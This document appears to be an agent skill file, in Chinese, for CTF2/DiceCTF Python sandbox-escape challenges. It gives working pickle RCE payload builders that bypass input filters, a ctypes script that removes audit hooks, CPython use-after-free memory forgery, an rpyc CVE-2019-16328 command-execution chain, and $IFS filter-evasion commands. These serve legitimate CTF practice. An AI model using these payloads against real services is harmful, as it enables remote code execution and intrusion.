---
name: ctf2-pwn-sandbox-escape
category: custom
description: >-
  CTF2/DiceCTF 类 Python 沙箱 pwn 实战：平台 nc 靶机 SNI 连接铁律、pickle opcode 层绕 WAF、audit hook + ctypes 绕过、CPython 内存伪造、rpyc CVE 利用
---

# CTF2 / DiceCTF Python 沙箱类 PWN 打法

适用：目标是 Python 沙箱逃逸（pickle / jail / audit hook / AST 过滤）或协议库反序列化（rpyc 等），
且题目来自 CTF2 练习场或 DiceCTF 官方公开题（带官方仓库链接）。

核心判断：**这类题 90% 有官方解题脚本**。先找仓库再自己啃，能省掉几十分钟。

---

## 0. 两条必背铁律（踩过的坑，别再踩）

### 铁律 1：CTF2 的 nc 靶机，TLS 必须发 SNI

```python
raw = socket.create_connection((HOST, PORT), timeout=15)
s = ctx.wrap_socket(raw, server_hostname=HOST)   # ← server_hostname 不能省
```

省了 `server_hostname`，TLS 握手不发 SNI，边缘代理按 SNI 路由后端靶机 → 找不到目标 →
返回一个 **43 KB 的 ASCII 艺术占位页**，内容是：

```
RANGE KEEPER  [ TARGET NOT FOUND ]
This address has no running target.
```

**假象**：平台 `ctf2_get_environment` 一直报 `status: running`、`access_ready: true`，
你会以为靶机崩了，去删环境重启 —— 换新地址后**还是一样**。白烧半小时。

**判据**：收到 `len == 43684` 且含 `TARGET NOT FOUND` 的响应 = SNI 没发，
不是靶机问题，不要重启环境。

### 铁律 2：`input()` + `split()` + `encode()` 是三重约束，不是一道

典型源码：

```python
pickle.loads(input("pickle: ").split()[0].encode())
```

攻击者受三条限制，**必须同时满足**：

1. `.split()` 按空白切分 → payload 里**不能出现** `\t \n \v \f \r` 和空格 (0x20)；
2. `.encode()` → payload **必须是合法 UTF-8**（否则 `UnicodeEncodeError: surrogates not allowed`）；
3. 被 `input()` 读入的文本行本身不能含裸换行。

第 2 条是最容易漏的：直接塞 `\x8c`（SHORT_BINUNICODE opcode）会失败，因为 `\x8c` 单独出现
不是合法 UTF-8 序列。**pickle 的 BINUNICODE 长度字段里的 `\x00` 也会被某些中转层吃掉。**

第 1 条还会咬到长度字段：BINUNICODE 的 1 字节长度值如果正好是 9/10/11/12/13/32，
整条 payload 就在那里被 `split()` 截断 → 远端报 `pickle data was truncated`。

**填充技巧**：命令拼上无害后缀直到长度字节安全，后缀用 `;:`（dash 里的空操作）。
**不要用 `;;`** —— dash 报 `Syntax error: ";;" unexpected`。

**命令里不能用空格** → 用 `$IFS`：
```sh
cat$IFS/app/flag.txt      # 代替 cat /app/flag.txt
ls$IFS-a$IFS/app          # 代替 ls -a /app
```

---

## 1. 开局：先找官方仓库

题目描述里基本都带来源链接。直接拉 tarball（`git clone` 在沙箱里常因 TLS 抖动失败，
`codeload` 稳）：

```bash
mkdir -p /work/dice && cd /work/dice
curl -sL -m 280 -o repo.tar.gz \
  "https://codeload.github.com/<org>/<repo>/tar.gz/<commit-sha>"
tar tzf repo.tar.gz | grep -iE 'unipickle|/irs/|diligent'   # 先看有哪些文件
tar xzf repo.tar.gz --wildcards '*/misc/<name>/*'
```

**关键文件**：`solve.py` / `solve.txt`（官方解）、`challenge.yml`（端口、健康检查串）、
`Dockerfile`（flag 路径、Python 版本、镜像 digest）。

GitHub API 有速率限制（无 token 时实测 403），别用 `api.github.com/contents`，用 tarball。

---

## 2. 题型判定 → 走哪条路

| 源码特征 | 题型 | 路径 |
|---|---|---|
| `pickle.loads(...)` | 反序列化 | 构造 `__reduce__` → 但先看输入过滤（铁律 2） |
| `ast.parse` + 黑名单 + `exec` | AST 过滤 jail | 找漏掉的语法节点；有 audit hook 则要走内存 |
| `sys.addaudithook` / `PySys_AddAuditHook` | audit hook | 见 §4 |
| `rpyc` / `SimpleXMLRPCServer` / 自定义 RPC | 协议库 CVE | 查版本 → 查 CVE → 看 handler 白名单 |

**优先做难度低的**：Easy 题通常就是标准反序列化，几分钟出；Hard 题再花时间。
CTF2 练习场的题目 `solve_count` 也是信号 —— 解得多的题路子成熟。

---

## 3. pickle RCE：可绕过 UTF-8 的 payload 模板

官方正解结构（DiceCTF 2024 unipickle）：

```python
# BINUNICODE 'os' + BINUNICODE 'system' + memo trick + STACK_GLOBAL + call
p = (b'X\x02\x00\x00\x00os'
     b'X\x06\x00\x00\x00system'
     b'q\xc2' b'\x8f00'          # BINPUT 194（\xc2 既当 opcode 参数又补齐 UTF-8）
     b'h\xc2' b'\x93'            # BINGET 194, STACK_GLOBAL
     b'(X' + len(cmd).to_bytes(4,'little') + cmd + b'tR.')
```

**为什么这个能过 UTF-8**：pickle 看到的是独立 opcode `\x8f`(EMPTY_SET)、`\x93`(STACK_GLOBAL)，
而 UTF-8 解码器看到的是 `\xc2\x8f`=U+008F、`\xc2\x93`=U+0093 —— 单字符、合法。
同时两个 memo 索引都是 194，`\xc2` 正好是 varint 编码的 194 的低位字节，一箭双雕。

**自己构造时的通用写法**（避免 NUL、避免空白）：

```python
def build(cmd: bytes) -> bytes:
    n = len(cmd)
    assert n < 256 and bytes([n]) not in b"\t\n\v\f\r "
    return (b'X\x02\x00\x00\x00os' b'X\x06\x00\x00\x00system'
            b'q\xc2' b'\x8f00' b'h\xc2' b'\x93'
            b'(X' + n.to_bytes(4,'little') + cmd + b'tR.')
```

注意 BINUNICODE 长度是**4 字节小端**，只写 1 字节会 `truncated`。

本地先验：`pickletools.dis(io.BytesIO(p))` 看 opcode 流，`pickle.loads(p)` 看能不能跑，
再检查 `any(b in WS for b in p)` 和 `p.decode('utf-8')` 不抛异常。**三条都过再打远端。**

---

## 4. audit hook 绕过（ctypes 摘钩子）

源码模式（diligent-auditor）：

```python
sys.addaudithook((lambda x: lambda *_: x(1))(os._exit))   # 任何 exec 事件 → 直接退出
for k in f.f_builtins: f.f_builtins[k] = None              # 内建全清空
```

但注意：`mod` 先被 import，所以 **import 进来的模块在清空时还可能残留引用**。
正解是用 `ctypes` 从子类链里拿到函数对象，做指针运算定位并弹出 audit hook 列表：

```python
ctypes
g = ().__class__.__base__.__subclasses__()[-2].__init__.__globals__
ref = g["byref"](g["py_object"](())); tp = g["POINTER"](g["c_uint64"])
ptr = g["cast"](ref, tp)
ptr = g["cast"](ptr.contents.value - 0x129b8, tp)
ptr = g["cast"](ptr.contents.value + 0x413c8, tp)
hooks = g["cast"](ptr.contents.value, g["py_object"]).value
hooks.pop()
g["_os"].system("cat flag-*.txt")
```

⚠️ **偏移量是硬编码的，跟 Python 小版本强绑定**。我们的镜像和官方 digest 不一致时偏移会错，
表现为 segmentation fault 或行为诡异。**先确认远端 Python 版本**（能 RCE 的话 `sys.version` 直接读），
不一致就得本地编译同版本镜像重算偏移。

约束：`mod` 长度 ≤16 且只能小写字母（所以 `ctypes` 可以，`builtins` 不行）；
`cod` 长度 ≤512 且必须是 `string.printable`（所以 `solve.txt` 里的单行压缩写法）。

---

## 5. CPython 内存伪造（IRS 类）

AST 过滤器挡了 `__`、`attr`、`with`、`keyword`、`Starred` 等，还额外用 C 扩展的 audit hook
（只放行第一次 `exec`）。这类题的解法是**绕过 Python 层，直接改内存**：

1. 用格式化字符串泄漏地址：`"{0.__new__}".format(str)` → 从 repr 里抠 hex；
2. 算两个偏移：`id(bytearray)` 和 `id(-5)`（小整数缓存）；
3. 分配一堆 100KB 的 `bytes` 做堆占位，再构造伪造头部的 `bytearray`；
4. 用 `__eq__` + `del o['a']` 制造 use-after-free；
5. `bytes(iter(d))` 把伪造数据变成真 `bytes`，再用 `object.__subclasses__()` 取 `os`。

这类题**不要自己推偏移**，直接用官方 `solve.py` 的常量 —— 平台镜像和官方 digest 一致时直接命中
（实测 IRS、diligent-auditor 都命中了）。不一致时本地用同版本 Python 重算。

---

## 6. rpyc CVE-2019-16328（Pike 类）

rpyc 4.1.0 的 `HANDLE_CMP` 不校验 op 名：

```python
# protocol.py: _handle_cmp
return getattr(type(obj), op)(obj, other)
```

传 `op="__getattribute__"` 就是任意属性访问。利用链：

```
conn._remote_root.__class__
  → get_service_aliases.__globals__
  → __builtins__.__dict__["__import__"]
  → subprocess.getoutput
```

关键实现细节：
- `__builtins__` 在模块 globals 里是 **module**，但走到 `__dict__` 拿到的才是 dict，
  对 module 直接 `__getitem__` 会拿到 `NotImplemented`（踩过）；
- 用 `sync_request(consts.HANDLE_CMP, obj, name, "__getattribute__")` 逐跳走；
- **TLS 版本**要自己包 stream：继承 `SocketStream`，在 `__init__` 里带 `server_hostname` 建 TLS，
  再 `connect_stream(TLSStream(HOST, PORT))`。

**顺手排除的错路**（省时间）：
- rpyc 4.1.0 的 brine 序列化器**不是 pickle**，`__reduce__` 不触发（对象到服务端变成普通对象，
  报 `unsupported operand type(s)`）；
- `_handle_pickle` 只做 `pickle.dumps`，不做 `loads` → pickle 攻击不成立。

---

## 7. flag 在哪

CTF2 平台用 `collection-target-v1` 模板（`/ctf2-entrypoint.sh` 可读到）：

```sh
printf '%s' "$FLAG" > /tmp/ctf2-flag/0
chmod 0444 /tmp/ctf2-flag/0
```

同时题目自己的 Dockerfile 可能把 flag 放在 `/app/flag.txt`、`/flag.<rand>.txt`、`/srv/flag.txt`。
**一次命令全部试一遍**：

```sh
cat /app/flag.txt 2>/dev/null; cat /flag*.txt 2>/dev/null; cat /tmp/ctf2-flag/0 2>/dev/null
```

⚠️ `cat</flag*` 这种重定向写法在 dash 里**不展开通配符**（报 `cannot open /flag*`），
通配符必须在参数位置：`cat$IFS/flag*`。

---

## 8. CTF2 MCP 接口要点

- 端点 `https://ctf2.dasctf.com/api/ai/v1/mcp`，鉴权用 **`Authorization: Bearer <accesskey>`**
  （`X-Agent-AccessKey` 头不行，会 401 `invalid_token`）；
- 必须做完整 MCP 握手：`initialize` → `notifications/initialized`（返回空 body 是正常的）→ `tools/call`，
  并且带 `Mcp-Session-Id` 头；
- **所有 environment / challenge 接口都要同时给 `practice_ground_id` 和 `challenge_id`**，
  只给 challenge_id 会 `INVALID_REQUEST`；
- `ctf2_submit_flag` 必须带 `confirmation: true`；
- 写操作限流 **30 次/分钟**（读 120），`RATE_LIMIT_EXCEEDED` 时按 `retry_after_ms` 等再重试，
  轮询前先 sleep，否则整轮拿到的都是空环境；
- 环境配额默认 **同时 1 个**，换题前必须先 `ctf2_user_delete_practice_id_challenges_challengeid_environment`
  释放（这个工具名很长但就是 delete environment）。

---

## 9. 收尾清单

- [ ] flag 提交后确认 `accepted: true`（4 题都是 attempt 1 通过）
- [ ] 销毁所有靶机，别占配额
- [ ] 解题脚本 + writeup 落到 `/work/persist/solve/`（持久目录，容器回收不丢）
